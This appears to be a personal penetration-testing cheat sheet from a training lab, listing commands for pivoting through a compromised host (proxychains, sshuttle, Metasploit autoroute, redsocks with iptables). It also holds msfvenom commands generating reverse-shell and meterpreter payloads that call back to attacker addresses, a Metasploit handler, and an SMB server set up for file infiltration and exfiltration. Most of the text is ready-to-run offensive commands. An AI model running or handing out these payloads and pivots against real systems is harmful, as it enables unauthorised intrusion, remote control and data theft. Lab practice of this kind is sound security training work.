#### Pivoting

### method 1:

Add to proxychains.conf:
`socks4 127.0.0.1 1080`  
`ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01`  
`proxychains nmap -sV 172.16.1.0-254`  

### Method 2:
*if I could nmap through this tunnel it would be the preffered method  

`sshuttle -vr root@NIX01 172.16.1.1/24 --ssh-cmd "ssh -i 10.10.110.123/root_ssh"`  

### Method 3:  
msf > use auxiliary/scanner/ssh/ssh_login_pubkey  
msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.10.110.123    
msf auxiliary(ssh_login_pubkey) > set USERNAME root  
msf auxiliary(ssh_login_pubkey) > set KEY_PATH 10.10.110.123/root_ssh  
msf auxiliary(ssh_login_pubkey) > run  
ctrl+z
sessions -u 2
background
use auxiliary/server/socks_proxy
run


meterpreter > run post/multi/manage/autoroute  
CTRL+Z  
use auxiliary/scanner/portscan/tcp   
set RHOSTS 172.16.1.0/24  

hhmmmmMMMM I must be doing something wrong I can curl some ip's I know are on the other side but cannot nmap or scan the range...   
dd

### Method 4:  

`ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01` *1080 is redsocks proxy default*  
`echo 1 > /proc/sys/net/ipv4/ip_forward`  
`iptables -t nat -A OUTPUT -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
`iptables -t nat -A PREROUTING -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
`/usr/sbin/redsocks -c /etc/redsocks.conf `

# Get a proper shell from a half/broken shell
`msfvenom -p cmd/unix/reverse_python lhost=69.201.13.55 lport=3344 R`
paste in your shell, profit
`python -c 'import pty; pty.spawn("/bin/sh")'`

## Start mult/handler:
`sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"`
`msfvenom -p windows/x64/meterpreter_reverse_http -f psh LHOST=10.10.14.14 LPORT=443 -o l.ps1`

## Start SMB for infil/exfil:  
`$ sudo impacket-smbserver -smb2support GUEST /home/kymb0/Desktop/backup/offshore/toolz`
